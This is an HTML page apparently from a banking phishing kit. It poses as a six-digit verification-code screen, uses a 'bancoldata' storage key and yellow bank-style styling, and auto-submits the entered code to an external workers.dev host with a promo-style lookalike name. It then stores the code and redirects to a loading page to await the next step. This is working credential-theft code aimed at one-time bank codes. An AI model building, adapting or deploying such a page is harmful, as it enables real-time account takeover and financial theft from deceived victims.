<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Código de Verificación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            height: 100%;
            width: 100%;
            background-color: #f0f0f0;
            overflow: hidden;
        }
        .image-container {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }
        .image-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .center-box {
            position: absolute;
            top: 55%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgb(255, 255, 255);
            width: 320px;
            height: 70px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 8px;
            padding: 0 15px;
        }
        .center-box .input-container {
            position: relative;
            width: 100%;
            display: flex;
            justify-content: space-between;
            gap: 8px;
        }
        .center-box input {
            width: 40px;
            height: 50px;
            text-align: center;
            font-size: 20px;
            border: none;
            border-bottom: 2px solid #ffe100;
            outline: none;
            background: transparent;
        }
        .button-container {
            position: absolute;
            top: 70.4%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            gap: 10px;
        }
        .button-container button {
            padding: 13px 35px;
            font-size: 13px;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
        }
        .button-container button:first-child {
            background-color: #ffffff;
            border: 1px solid black;
        }
        .button-container button:last-child {
            background-color: #ffda37;
            color: black;
        }
        .button-container button:last-child:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="img/cel1.jpg" alt="Background Image">
        <div class="center-box">
            <div class="input-container">
                <input type="tel" maxlength="1" id="input1" class="otp-input">
                <input type="tel" maxlength="1" id="input2" class="otp-input">
                <input type="tel" maxlength="1" id="input3" class="otp-input">
                <input type="tel" maxlength="1" id="input4" class="otp-input">
                <input type="tel" maxlength="1" id="input5" class="otp-input">
                <input type="tel" maxlength="1" id="input6" class="otp-input">
            </div>
        </div>
        <div class="button-container">
            <button onclick="window.history.back()">Cancelar</button>
            <button id="submitOtpButton" disabled>Verificar</button>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.otp-input');
        const submitOtpButton = document.getElementById('submitOtpButton');

        // Auto-focus y navegación entre inputs
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value;
                
                // Solo permitir números
                if (!/^\d$/.test(value)) {
                    e.target.value = '';
                    return;
                }

                // Auto-enfocar siguiente input
                if (index < inputs.length - 1 && value !== '') {
                    inputs[index + 1].focus();
                }

                // Verificar si todos los campos están llenos
                checkAllInputsFilled();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                }
            });

            // Pegado de código completo
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                if (pasteData.length === 6) {
                    pasteData.split('').forEach((char, charIndex) => {
                        if (inputs[charIndex]) {
                            inputs[charIndex].value = char;
                        }
                    });
                    checkAllInputsFilled();
                    inputs[5].focus();
                }
            });
        });

        function checkAllInputsFilled() {
            const allFilled = Array.from(inputs).every(input => input.value !== '');
            submitOtpButton.disabled = !allFilled;
            
            // Si todos están llenos, enviar automáticamente
            if (allFilled) {
                submitOtp();
            }
        }

        async function submitOtp() {
            const otpCode = Array.from(inputs)
                                .map(input => input.value)
                                .join('');
            
            if (otpCode.length !== 6) {
                alert('Por favor ingresa el código completo de 6 dígitos');
                return;
            }

            try {
                // Obtener transactionId del localStorage
                const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                const transactionId = bancoldata.transactionId;

                if (!transactionId) {
                    alert('Error: No se encontró la transacción');
                    return;
                }

                console.log('Enviando OTP:', { transactionId, otp: otpCode });

                // Enviar OTP al worker
                const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/otp-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        transactionId: transactionId,
                        otp: otpCode
                    })
                });

                const result = await response.json();
                console.log('Respuesta OTP:', result);

                if (result.ok) {
                    // Guardar OTP en localStorage
                    bancoldata.otp = otpCode;
                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
                    
                    // Redirigir a loading para esperar siguiente acción
                    window.location.href = 'loading.html';
                } else {
                    alert('Error al enviar el código: ' + (result.error || 'Error desconocido'));
                }

            } catch (error) {
                console.error('Error enviando OTP:', error);
                alert('Error de conexión al enviar el código');
            }
        }

        submitOtpButton.addEventListener('click', submitOtp);

        // También enviar con Enter en cualquier input
        inputs.forEach(input => {
            input.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    submitOtp();
                }
            });
        });

        // Auto-focus en el primer input al cargar
        window.addEventListener('load', () => {
            inputs[0].focus();
        });
    </script>
</body>
</html>
